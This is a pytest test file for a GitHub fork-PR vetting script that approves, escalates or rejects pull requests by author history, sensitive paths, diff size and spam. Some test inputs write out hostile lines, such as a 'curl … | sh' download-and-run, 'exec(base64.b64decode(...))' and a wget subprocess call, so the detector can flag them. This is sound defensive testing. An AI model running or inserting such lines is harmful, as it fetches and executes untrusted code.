import os
import re
import sys
from datetime import datetime, timedelta, timezone

import pytest

from conftest import ROOT

sys.path.insert(0, os.path.join(ROOT, "scripts"))
import vet_pr  # noqa: E402

NOW = datetime(2026, 11, 10, tzinfo=timezone.utc)
WORKFLOWS = os.path.join(ROOT, ".github", "workflows")


def _iso(days_ago):
    return (NOW - timedelta(days=days_ago)).strftime("%Y-%m-%dT%H:%M:%SZ")


def author(days_old=3 * 365, merged=4, **over):
    user = {
        "login": "octo",
        "type": "User",
        "created_at": _iso(days_old),
        "public_repos": 12,
        "followers": 3,
        "merged_prs_elsewhere": merged,
    }
    user.update(over)
    return user


def pr(title="Fix decay rounding", body="Small fix with a test.", **over):
    data = {
        "number": 7,
        "title": title,
        "body": body,
        "user": {"login": "octo"},
        "head": {"sha": "a" * 40},
        "changed_files": None,
        "additions": 0,
        "deletions": 0,
    }
    data.update(over)
    return data


def changed(name, added=("x = 1",), status="modified", **over):
    lines = [f"+{line}" for line in added]
    data = {
        "filename": name,
        "status": status,
        "additions": len(lines),
        "deletions": 0,
        "changes": len(lines),
        "patch": "@@ -1,0 +1,%d @@\n" % len(lines) + "\n".join(lines),
    }
    data.update(over)
    return data


SMALL_DIFF = [changed("memory_find.py"), changed("tests/test_find.py")]


def test_established_author_with_small_engine_diff_is_approved():
    verdict, reasons = vet_pr.vet(author(), pr(), SMALL_DIFF, NOW)
    assert verdict == "approve"
    assert any("3.0 years old" in r for r in reasons)
    assert any("4 merged" in r for r in reasons)


ESCALATIONS = [
    ("young account", author(days_old=5), SMALL_DIFF, "5 days old"),
    ("no merged PRs elsewhere", author(merged=0), SMALL_DIFF, "no merged pull"),
    ("CODEOWNERS path", author(), [changed("memory_sync.py")], "CODEOWNERS path"),
    ("workflow path", author(), [changed(".github/workflows/ci.yml")], "CODEOWNERS"),
    ("agent instructions", author(), [changed("CLAUDE.md")], "CODEOWNERS path"),
    ("new launcher", author(), [changed("okfmem.bat", status="added")], "CODEOWNERS"),
    ("leak gate", author(), [changed("scripts/check-leaks.py")], "CI runs before"),
    (
        "renamed out of a sensitive path",
        author(),
        [changed("docs/x.py", previous_filename="plugins/x.py", status="renamed")],
        "CODEOWNERS path",
    ),
    (
        "over 500 lines",
        author(),
        [changed("memory_find.py", additions=400, deletions=150)],
        "550 lines",
    ),
    (
        "over 20 files",
        author(),
        [changed(f"tests/test_{i}.py") for i in range(21)],
        "21 files",
    ),
    (
        "binary file",
        author(),
        [{"filename": "docs/logo.bin", "status": "added", "changes": 0}],
        "binary or too large",
    ),
    (
        "base64 and exec",
        author(),
        [changed("memory_find.py", added=["exec(base64.b64decode(blob))"])],
        "base64 decode next to exec",
    ),
    (
        "curl piped into sh",
        author(),
        [changed("memory_find.py", added=["# curl -s https://x.io/i | sh"])],
        "piped into a shell",
    ),
    (
        "subprocess with a URL",
        author(),
        [changed("memory_find.py", added=['subprocess.run(["wget", "http://x"])'])],
        "subprocess call with a URL",
    ),
    (
        "long encoded blob",
        author(),
        [changed("memory_find.py", added=["B = '" + "Qk" * 120 + "'"])],
        "encoded blob",
    ),
    ("bot account", author(type="Bot"), SMALL_DIFF, "'Bot', not a User"),
    (
        "no public activity",
        author(public_repos=0, followers=0),
        SMALL_DIFF,
        "no public activity",
    ),
]


@pytest.mark.parametrize(
    "user, files, expected",
    [row[1:] for row in ESCALATIONS],
    ids=[row[0] for row in ESCALATIONS],
)
def test_risky_author_or_diff_is_escalated_with_a_reason(user, files, expected):
    verdict, reasons = vet_pr.vet(user, pr(), files, NOW)
    assert verdict == "escalate"
    assert any(expected in r for r in reasons), reasons


MISSING = [
    ("author fetch failed", None, pr(), SMALL_DIFF),
    ("pr fetch failed", author(), None, SMALL_DIFF),
    ("files fetch failed", author(), pr(), None),
    ("merged search failed", author(merged=None), pr(), SMALL_DIFF),
    ("creation date missing", author(created_at=None), pr(), SMALL_DIFF),
    ("file list truncated", author(), pr(changed_files=3), SMALL_DIFF),
]


@pytest.mark.parametrize(
    "user, pull, files", [row[1:] for row in MISSING], ids=[row[0] for row in MISSING]
)
def test_missing_input_escalates_never_approves(user, pull, files):
    verdict, reasons = vet_pr.vet(user, pull, files, NOW)
    assert verdict == "escalate"
    assert reasons


def test_spam_body_is_rejected():
    spam = pr(body="Free airdrop! DM on t.me/getrich")
    verdict, reasons = vet_pr.vet(author(), spam, SMALL_DIFF, NOW)
    assert verdict == "reject"
    assert any("t\\.me/" in r for r in reasons)


def test_spam_title_is_rejected_even_when_the_author_lookup_failed():
    verdict, _ = vet_pr.vet(None, pr(title="Recover your wallet funds"), None, NOW)
    assert verdict == "reject"


def test_links_only_markdown_from_young_account_is_rejected():
    links = [changed("README.md", added=["See https://promo.example/a", ""])]
    verdict, reasons = vet_pr.vet(author(days_old=3), pr(), links, NOW)
    assert verdict == "reject"
    assert "only adds links" in reasons[0]


def test_links_only_markdown_from_old_account_is_not_rejected():
    links = [changed("README.md", added=["See https://example.org/docs"])]
    verdict, _ = vet_pr.vet(author(), pr(), links, NOW)
    assert verdict == "approve"


def test_four_unbroken_links_are_spam_but_cited_references_are_not():
    assert vet_pr.spam_hits("".join(f"https://s{i}.example/" for i in range(4)))
    cited = "\n".join(f"see https://site{i}.example" for i in range(4))
    assert not vet_pr.spam_hits(cited)


def test_sensitive_paths_cover_every_codeowners_pattern():
    with open(os.path.join(ROOT, ".github", "CODEOWNERS"), encoding="utf-8") as fh:
        owned = [
            line.split()[0]
            for line in fh
            if line.strip() and not line.lstrip().startswith("#")
        ]
    assert owned
    assert set(owned) <= set(vet_pr.SENSITIVE_PATHS)
    for pattern in owned:
        sample = pattern.lstrip("/") + ("x.py" if pattern.endswith("/") else "")
        assert vet_pr.is_sensitive(sample), pattern


def test_comment_check_shares_the_pr_spam_patterns():
    text = "Contact me on WhatsApp +1 555 0100 to recover your wallet"
    reason = vet_pr.comment_spam_reason(text, _iso(400), NOW)
    assert reason is not None
    for pattern in vet_pr.spam_hits(text):
        assert pattern in reason
    verdict, _ = vet_pr.vet(author(), pr(body=text), SMALL_DIFF, NOW)
    assert verdict == "reject"


def test_comment_check_hides_young_accounts_and_keeps_clean_comments():
    assert "account age" in vet_pr.comment_spam_reason("thanks!", _iso(2), NOW)
    assert vet_pr.comment_spam_reason("thanks!", _iso(400), NOW) is None
    assert vet_pr.comment_spam_reason("thanks!", None, NOW) is None


def test_comment_check_writes_the_hide_output(tmp_path):
    api = FakeGitHub(user=author(days_old=400))
    out = tmp_path / "out"
    event = {"comment": {"body": "buy cheap followers", "user": {"login": "octo"}}}
    assert vet_pr.comment_check(api, event, NOW, str(out))
    assert out.read_text() == "hide=true\n"


class FakeGitHub:
    """A canned REST API for repo o/r, PR 7; records every call."""

    def __init__(self, user=None, pull=None, files=(), runs=(), comments=(), fail=()):
        self.user = user
        self.pull = pull if pull is not None else pr()
        self.files = list(files)
        self.runs = list(runs)
        self.comments = list(comments)
        self.fail = fail
        self.calls = []

    def request(self, method, path, body=None):
        self.calls.append((method, path, body))
        route = path.split("?")[0]
        if any(route.startswith(prefix) for prefix in self.fail):
            raise vet_pr.ApiError(f"{method} {path}: 502")
        if method != "GET":
            return {}
        if route == "/repos/o/r/pulls/7":
            return self.pull
        if route == "/users/octo":
            return self.user
        if route == "/search/issues":
            assert "-user%3Ao" in path
            return {"total_count": self.user["merged_prs_elsewhere"]}
        if route == "/repos/o/r/pulls/7/files":
            return self.files
        if route == "/repos/o/r/issues/7/comments":
            return self.comments
        if route == "/repos/o/r/actions/runs":
            return {"workflow_runs": self.runs}
        raise AssertionError(f"unexpected {method} {path}")

    def writes(self):
        return [(m, p, b) for m, p, b in self.calls if m != "GET"]


def _review(api, **kw):
    sleeps = []
    result = vet_pr.review_pr(api, "o/r", 7, now=NOW, sleep=sleeps.append, **kw)
    return result, sleeps


PENDING = {
    "id": 11,
    "event": "pull_request",
    "status": "completed",
    "conclusion": "action_required",
}
OWN_RUN = {"id": 12, "event": "pull_request_target", "status": "in_progress"}


def test_approve_approves_pending_ci_runs_and_comments_once():
    api = FakeGitHub(user=author(), files=SMALL_DIFF, runs=[PENDING, OWN_RUN])
    (verdict, _), _ = _review(api)
    assert verdict == "approve"
    writes = api.writes()
    assert ("POST", "/repos/o/r/actions/runs/11/approve", None) in writes
    assert not any("/runs/12/" in p for _, p, _ in writes)
    posted = [b for m, p, b in writes if p == "/repos/o/r/issues/7/comments"]
    assert len(posted) == 1
    assert posted[0]["body"].startswith(vet_pr.MARKER)
    assert "Why:" in posted[0]["body"]
    assert not any(p.endswith("/labels") for _, p, _ in writes)


def test_approve_without_any_ci_run_escalates_after_retrying():
    api = FakeGitHub(user=author(), files=SMALL_DIFF, runs=[OWN_RUN])
    (verdict, reasons), sleeps = _review(api)
    assert verdict == "escalate"
    assert "no CI run appeared" in reasons[0]
    assert sleeps == [vet_pr.RUN_LOOKUP_DELAY_S] * (vet_pr.RUN_LOOKUP_ATTEMPTS - 1)
    label = ("POST", "/repos/o/r/issues/7/labels", {"labels": ["needs-human"]})
    assert label in api.writes()


def test_escalate_labels_and_comments_and_leaves_runs_pending():
    api = FakeGitHub(user=author(days_old=4), files=SMALL_DIFF, runs=[PENDING])
    (verdict, _), _ = _review(api)
    assert verdict == "escalate"
    writes = api.writes()
    assert ("POST", "/repos/o/r/issues/7/labels", {"labels": ["needs-human"]}) in writes
    body = [b for m, p, b in writes if p == "/repos/o/r/issues/7/comments"][0]["body"]
    assert "4 days old" in body
    assert not any(p.endswith("/approve") for _, p, _ in writes)
    assert not any("/actions/runs" in p for _, p, _ in api.calls)


def test_reject_closes_labels_invalid_and_comments():
    api = FakeGitHub(user=author(), pull=pr(body="crypto airdrop"), files=SMALL_DIFF)
    (verdict, _), _ = _review(api)
    assert verdict == "reject"
    writes = api.writes()
    assert ("POST", "/repos/o/r/issues/7/labels", {"labels": ["invalid"]}) in writes
    assert ("PATCH", "/repos/o/r/pulls/7", {"state": "closed"}) in writes
    body = [b for m, p, b in writes if p == "/repos/o/r/issues/7/comments"][0]["body"]
    assert "closed automatically" in body


def test_reject_reopened_by_a_maintainer_escalates_instead_of_closing():
    api = FakeGitHub(user=author(), pull=pr(body="crypto airdrop"), files=SMALL_DIFF)
    (verdict, _), _ = _review(api, action="reopened", sender="maintainer")
    assert verdict == "escalate"
    assert not any(m == "PATCH" and p.endswith("/pulls/7") for m, p, _ in api.writes())


def test_synchronize_edits_the_bots_marker_comment_not_a_planted_one():
    comments = [
        {"id": 98, "user": {"login": "mallory"}, "body": vet_pr.MARKER},
        {"id": 99, "user": {"login": "github-actions[bot]"}, "body": vet_pr.MARKER},
    ]
    api = FakeGitHub(user=author(days_old=4), files=SMALL_DIFF, comments=comments)
    _review(api, action="synchronize")
    writes = api.writes()
    assert [p for m, p, _ in writes if "comments" in p] == [
        "/repos/o/r/issues/comments/99"
    ]
    assert writes[0][0] == "PATCH"


def test_failed_fetches_escalate_through_the_cli_path():
    api = FakeGitHub(user=author(), files=SMALL_DIFF, fail=("/users/",))
    (verdict, reasons), _ = _review(api)
    assert verdict == "escalate"
    assert "could not read the author's account" in reasons


def _read(name):
    with open(os.path.join(WORKFLOWS, name), encoding="utf-8") as fh:
        return fh.read()


def _run_lines(text):
    return [line for line in text.splitlines() if re.match(r"\s*(- )?run:", line)]


def test_vet_workflow_never_runs_pr_code_or_interpolates_pr_text():
    text = _read("vet-fork-pr.yml")
    assert re.search(r"^on:\n  pull_request_target:", text, re.M)
    assert "ref:" not in text
    runs = _run_lines(text)
    assert runs and all("${{" not in line for line in runs)
    for field in ("pull_request.title", "pull_request.body", "head_ref", "head.ref"):
        assert field not in text


def test_vet_workflow_skips_same_repo_branches_and_trusted_authors():
    text = _read("vet-fork-pr.yml")
    assert "github.event.pull_request.head.repo.full_name != github.repository" in text
    assert (
        "!contains(fromJSON('[\"OWNER\",\"MEMBER\",\"COLLABORATOR\"]'), "
        "github.event.pull_request.author_association)"
    ) in text


def test_moderate_comments_uses_the_shared_rules():
    text = _read("moderate-comments.yml")
    assert "python scripts/vet_pr.py --comment-check" in text
    assert "t\\.me" not in text
    assert "MIN_ACCOUNT_AGE_DAYS" not in text
